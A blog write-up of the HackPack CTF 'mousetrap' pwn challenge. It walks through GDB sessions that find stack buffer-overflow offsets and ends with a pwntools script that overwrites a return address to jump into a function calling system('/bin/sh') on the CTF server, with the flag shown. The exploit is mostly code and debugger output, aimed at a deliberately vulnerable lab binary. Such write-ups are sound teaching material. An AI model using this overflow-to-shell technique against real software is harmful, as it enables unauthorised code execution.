# HackPack CTF "Pwn Challenge"

Playing HackpackCTF was quite a bit fun and enjoying. Here, I will explain about the pwn challenges that I solved during CTF.
<!--more-->
---

# HackPack CTF

HackPack CTF is a security competition that is part of the two security courses at NCSU: CSC-405 Computer Security and CSC-591 Systems Attacks and Defenses. The target audience is people interested in computer security that have some related background (like took a security course before ;) and want to exercise their skills in a secure environment by solving security challenges.
For more detail you can visit [here](https://hackpack.club/ctf2020).

I will talk about the challenges that I solved during live of ctf.

## Pwn Challenges

### mousetrap
#### Description[232]
Are you savvy enough to steal a piece of cheese?

`nc cha.hackpack.club 41719`

#### File: [mousetrap](public/files/ctf/mousetrap)

**Solution:-** As I run the challenge I was asked to enter the name randomly and then code Sequence but got the output with `SNAAAAAAAP! you died!%`. Now I grabbed my gdb and analyze the ELF file. 

```php
gr4n173@root:~# gdb -q mousetrap
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 9.1 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from mousetrap...
(No debugging symbols found in mousetrap)
gef➤ checksec mousetrap
[*] '/home/gr4n173/pwn/mousetrapfile/mousetrap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

From this output, RELRO(partial) indicate lazy binding was possible and NX(non-executable) enabled I was unable inject shellcode but Stack `No canary found` indicated there was buffer overflow.

```php
gef➤  info functions
All defined functions:
Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  strcpy@plt
0x00000000004005e0  puts@plt
0x00000000004005f0  system@plt
0x0000000000400600  printf@plt
0x0000000000400610  read@plt
0x0000000000400620  setvbuf@plt
0x0000000000400630  _start
0x0000000000400660  _dl_relocate_static_pie
0x0000000000400670  deregister_tm_clones
0x00000000004006a0  register_tm_clones
0x00000000004006e0  __do_global_dtors_aux
0x0000000000400710  frame_dummy
0x0000000000400717  cheeeeeeeese
0x000000000040072a  init
0x000000000040078b  set_mouse_name
0x00000000004007c1  grab_cheese
0x00000000004007e3  deactivate_trap
0x0000000000400823  menu
0x0000000000400842  main
0x00000000004008c0  __libc_csu_init
0x0000000000400930  __libc_csu_fini
0x0000000000400934  _fini
gef➤
```
Then I break a point in `set_mouse_name` function and the I run it. 

```php
gef➤  break set_mouse_name
Breakpoint 1 at 0x40078f
gef➤  run
Starting program: /home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap 
Welcome little mouse
can you steal the cheese from the mouse trap

Breakpoint 1, 0x000000000040078f in set_mouse_name ()
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdc90  →  0x00000000004008c0  →  <__libc_csu_init+0> push r15
$rbx   : 0x0               
$rcx   : 0x00007ffff7ece643  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffdb70  →  0x00007fffffffdcb0  →  0x00000000004008c0  →  <__libc_csu_init+0> push r15
$rbp   : 0x00007fffffffdb70  →  0x00007fffffffdcb0  →  0x00000000004008c0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007ffff7f9d723  →  0xf9f4c0000000000a
$rdi   : 0x00007fffffffdc90  →  0x00000000004008c0  →  <__libc_csu_init+0> push r15
$rip   : 0x000000000040078f  →  <set_mouse_name+4> sub rsp, 0x10
$r8    : 0x2d              
$r9    : 0x00007ffff7fe3530  →  <_dl_fini+0> push rbp
$r10   : 0x00007ffff7fef7c0  →  <strcmp+2544> pxor xmm0, xmm0
$r11   : 0x246             
$r12   : 0x0000000000400630  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdd90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb70│+0x0000: 0x00007fffffffdcb0  →  0x00000000004008c0  →  <__libc_csu_init+0> push r15	 ← $rsp, $rbp
0x00007fffffffdb78│+0x0008: 0x000000000040087d  →  <main+59> mov rdx, QWORD PTR [rbp-0x8]
0x00007fffffffdb80│+0x0010: 0x00007fffffffdd98  →  0x00007fffffffe120  →  "/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]"
0x00007fffffffdb88│+0x0018: 0x00000001ffffdcd0
0x00007fffffffdb90│+0x0020: 0x0000000000000000
0x00007fffffffdb98│+0x0028: 0x0000000000000000
0x00007fffffffdba0│+0x0030: 0x0000000000000000
0x00007fffffffdba8│+0x0038: 0x00007ffff7ffe730  →  0x00007ffff7fd2000  →  0x00010102464c457f
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400786 <init+92>        (bad)  
     0x400787 <init+93>        call   QWORD PTR [rax+0x4855c35d]
     0x40078d <set_mouse_name+2> mov    ebp, esp
 →   0x40078f <set_mouse_name+4> sub    rsp, 0x10
     0x400793 <set_mouse_name+8> mov    QWORD PTR [rbp-0x8], rdi
     0x400797 <set_mouse_name+12> lea    rdi, [rip+0x1b2]        # 0x400950
     0x40079e <set_mouse_name+19> mov    eax, 0x0
     0x4007a3 <set_mouse_name+24> call   0x400600 <printf@plt>
     0x4007a8 <set_mouse_name+29> mov    rax, QWORD PTR [rbp-0x8]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mousetrap", stopped 0x40078f in set_mouse_name (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40078f → set_mouse_name()
[#1] 0x40087d → main()
```
Then I run `ni` till I reached to `read` where my value was stored.

```php
gef➤  ni
0x00000000004007b9 in set_mouse_name ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdc90  →  0x00000000004008c0  →  <__libc_csu_init+0> push r15
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x20              
$rsp   : 0x00007fffffffdb60  →  0x0000000000000000
$rbp   : 0x00007fffffffdb70  →  0x00007fffffffdcb0  →  0x00000000004008c0  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffdc90  →  0x00000000004008c0  →  <__libc_csu_init+0> push r15
$rdi   : 0x0               
$rip   : 0x00000000004007b9  →  <set_mouse_name+46> call 0x400610 <read@plt>
$r8    : 0x2d              
$r9    : 0x6               
$r10   : 0x0000000000400950  →  0x4500203a656d614e ("Name: "?)
$r11   : 0x246             
$r12   : 0x0000000000400630  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdd90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb60│+0x0000: 0x0000000000000000	 ← $rsp
0x00007fffffffdb68│+0x0008: 0x00007fffffffdc90  →  0x00000000004008c0  →  `__libc_csu_init+0` push r15
0x00007fffffffdb70│+0x0010: 0x00007fffffffdcb0  →  0x00000000004008c0  →  <__libc_csu_init+0> push r15	 ← $rbp
0x00007fffffffdb78│+0x0018: 0x000000000040087d  →  <main+59> mov rdx, QWORD PTR [rbp-0x8]
0x00007fffffffdb80│+0x0020: 0x00007fffffffdd98  →  0x00007fffffffe120  →  "/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]"
0x00007fffffffdb88│+0x0028: 0x00000001ffffdcd0
0x00007fffffffdb90│+0x0030: 0x0000000000000000
0x00007fffffffdb98│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007ac <set_mouse_name+33> mov    edx, 0x20
     0x4007b1 <set_mouse_name+38> mov    rsi, rax
     0x4007b4 <set_mouse_name+41> mov    edi, 0x0
 →   0x4007b9 <set_mouse_name+46> call   0x400610 <read@plt>
   ↳    0x400610 <read@plt+0>     jmp    QWORD PTR [rip+0x200a22]        # 0x601038 <read@got.plt>
        0x400616 <read@plt+6>     push   0x4
        0x40061b <read@plt+11>    jmp    0x4005c0
        0x400620 <setvbuf@plt+0>  jmp    QWORD PTR [rip+0x200a1a]        # 0x601040 <setvbuf@got.plt>
        0x400626 <setvbuf@plt+6>  push   0x5
        0x40062b <setvbuf@plt+11> jmp    0x4005c0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
read@plt (
   $rdi = 0x0000000000000000,
   $rsi = 0x00007fffffffdc90 → 0x00000000004008c0 → `libc_csu_init+0` push r15,
   $rdx = 0x0000000000000020
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mousetrap", stopped 0x4007b9 in `set_mouse_name` (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007b9 → `set_mouse_name()`
[#1] 0x40087d → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

There you can see `$rdx`=`0x0000000000000020` which is hex value and it allocates 32 bytes of data from input. But given file was 64bit(`8*8=64`) so 8 bytes was allocated for `rbp`. So the actually bytes that was allocated by `name` variable was 24(32-8)bytes.
As soon as I got I can check that in gdb.

**32 bytes data:**

```php
gef➤  pattern create 32
[+] Generating a pattern of 32 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaa
[+] Saved as '$_gef0'
gef➤  run
Starting program: /home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap 
Welcome little mouse
can you steal the cheese from the mouse trap
Name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaa
Enter Code Sequence of 7016996765293437284: SNAAAAAAAP! you died![Inferior 1 (process 11792) exited normally]
gef➤ 
```
**24 bytes data:**

```php
gef➤  pattern create 24
[+] Generating a pattern of 24 bytes
aaaaaaaabaaaaaaacaaaaaaa
[+] Saved as '$_gef0'
gef➤  run
Starting program: /home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap 
Welcome little mouse
can you steal the cheese from the mouse trap
Name: aaaaaaaabaaaaaaacaaaaaaa
Enter Code Sequence of 10: 

```

From here I was asked for code sequence. Then offset of code sequence was found as follow:-

```php
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as `'$_gef0'`  
gef➤  run
Starting program: /home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap
Welcome little mouse
can you steal the cheese from the mouse trap
Name: aaaaaaaabaaaaaaacaaaaaaa@
Enter Code Sequence of 2624: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007e2 in `grab_cheese` ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdb60  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x0               
$rcx   : 0x60              
$rdx   : 0x15              
$rsp   : 0x00007fffffffdb78  →  "daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"
$rbp   : 0x6161616161616163 ("caaaaaaa"?)
$rsi   : 0x00007fffffffdbe0  →  "kaaaaaaalaaaaaaamaaa\n"
$rdi   : 0x00007fffffffdbb0  →  "kaaaaaaalaaaaaaamaaa\n"
$rip   : 0x00000000004007e2  →  <grab_cheese+33> ret 
$r8    : 0x0               
$r9    : 0x1d              
$r10   : 0x00007ffff7feff40  →  `<strcmp+4464>` pxor xmm0, xmm0
$r11   : 0x00007ffff7f3fc00  →  `<__strcpy_avx2+0>` mov rcx, rsi
$r12   : 0x0000000000400630  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffdd90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb78│+0x0000: "daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"	 ← $rsp
0x00007fffffffdb80│+0x0008: "eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"
0x00007fffffffdb88│+0x0010: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
0x00007fffffffdb90│+0x0018: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x00007fffffffdb98│+0x0020: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n"
0x00007fffffffdba0│+0x0028: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n"
0x00007fffffffdba8│+0x0030: "jaaaaaaakaaaaaaalaaaaaaamaaa\n"
0x00007fffffffdbb0│+0x0038: "kaaaaaaalaaaaaaamaaa\n"	 ← $rdi
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007db <grab_cheese+26> call   0x4005d0 <strcpy@plt>
     0x4007e0 <grab_cheese+31> nop    
     0x4007e1 <grab_cheese+32> leave  
 →   0x4007e2 <grab_cheese+33> ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mousetrap", stopped 0x4007e2 in `grab_cheese ()`, reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007e2 → `grab_cheese()`
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```
Now there you can see the address of `$rsp` is replaced by variable so I took that variable and found the offset.

```php
gef➤  pattern offset daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja
[+] Searching 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja'
[+] Found at offset 24 (big-endian search) 
gef➤
```

So a `Code Sequence` accepted 24 bytes of data after that value it was overflow and gave me `SIGSEGV` error you can see in the above output.

Now my offsets combination will be 


> Name => 24 + 1( to overflow) bytes
> 
Code Sequence => 24 + (address of shell) bytes


Then my final task was to find the address of shell(/bin/bash or /bin/sh) inside the file. For that I again searched for the functions which seems interesting and then I found `cheeeeeeeese` functions and disassemble that function.

```php
gef➤  info functions
All defined functions:
Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  strcpy@plt
0x00000000004005e0  puts@plt
0x00000000004005f0  system@plt
0x0000000000400600  printf@plt
0x0000000000400610  read@plt
0x0000000000400620  setvbuf@plt
0x0000000000400630  _start
0x0000000000400660  `_dl_relocate_static_pie`
0x0000000000400670  `deregister_tm_clones`
0x00000000004006a0  `register_tm_clones`
0x00000000004006e0  `__do_global_dtors_aux`
0x0000000000400710  `frame_dummy`
0x0000000000400717  cheeeeeeeese
0x000000000040072a  init
0x000000000040078b  `set_mouse_name`
0x00000000004007c1  `grab_cheese`
0x00000000004007e3  `deactivate_trap`
0x0000000000400823  menu
0x0000000000400842  main
0x00000000004008c0  `__libc_csu_init`
0x0000000000400930  `__libc_csu_fini`
0x0000000000400934  `_fini`
gef➤  disass 0x0000000000400717
Dump of assembler code for function cheeeeeeeese:
   0x0000000000400717 <+0>:	push   rbp
   0x0000000000400718 <+1>:	mov    rbp,rsp
   0x000000000040071b <+4>:	lea    rdi,[rip+0x226]        # 0x400948
   0x0000000000400722 <+11>:	call   0x4005f0 <system@plt>
   0x0000000000400727 <+16>:	nop
   0x0000000000400728 <+17>:	pop    rbp
   0x0000000000400729 <+18>:	ret    
End of assembler dump
```

Then there you can find the `system address` before that there should be `/bin/sh` shell so checking the string at address `0x400948`. 

```c
gef➤  disass cheeeeeeeese
Dump of assembler code for function cheeeeeeeese:
   0x0000000000400717 <+0>:	push   rbp
   0x0000000000400718 <+1>:	mov    rbp,rsp
   0x000000000040071b <+4>:	lea    rdi,[rip+0x226]        # 0x400948
   0x0000000000400722 <+11>:	call   0x4005f0 <system@plt>
   0x0000000000400727 <+16>:	nop
   0x0000000000400728 <+17>:	pop    rbp
   0x0000000000400729 <+18>:	ret    
End of assembler dump.
gef➤  x/s 0x400948
0x400948:	"/bin/sh"
gef➤  
```

So In order to execute the shell I had to call the address before the address of `/bin/sh` so that after overflow that address will be executed and we got the shell i.e. `0x000000000040071b`.

So my final payload was:- 

> Name => 24 + 1( to overflow) bytes
> 
Code Sequence => 24 + (address before /bin/sh) bytes

In order to execute this on server of `hackpack`and get a flag I made script in python.

```python
from pwn import * 
from sys import * 

context= ['tmux', 'new-window']
p=remote('cha.hackpack.club',41719)
elf=ELF("./mousetrap")
p=gdb.debug("./mousetrap")
p.recvuntil("Name: ")

# to overflow the Code sequence 
payload= "A"*24 
payload+= p64(0x40) #value to overflow the name variable
p.send(payload)

p.recvuntil("Enter Code Sequence of 64: ")

payload2= "A"*24
payload2+= p64(0x000000000040071b)#  address before /bin/sh
p.send(payload2)

p.interactive()
```

By running this I got the flag .

```php
gr4n173@root:~# python exploit.py
+] Starting local process './mousetrap': pid 14085
[*] '/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/usr/bin/gdbserver': pid 14089
[*] running in new terminal: /usr/bin/gdb -q  "./mousetrap" -x "/tmp/pwnQRen2_.gdb"
[*] Switching to interactive mode
Detaching from process 14105
$ ls
flag.txt
mousetrap
$ cat flag.txt
flag{C0nTr0l_S1Z3_4_$h3LL}
```


## Conclusion:-

This challenge include a simple Buffer overflow(BoF) task and had to call a function `cheeeeeeeese` where `/bin/sh` was located instead of providing our global offset of `/bin/sh`. 

Stay updated to my blog, I will be posting next writeup soon. I started writing a series of `Exploitation & Pwning` posts as this is my first post of this series here I explained about BoF. At last but not least I like to thank my friend `Linuz` for helping me out. 

I would like to thank all my reader. Feedback Really appreciated in comment below. 

Stay Safe

Keep Learning




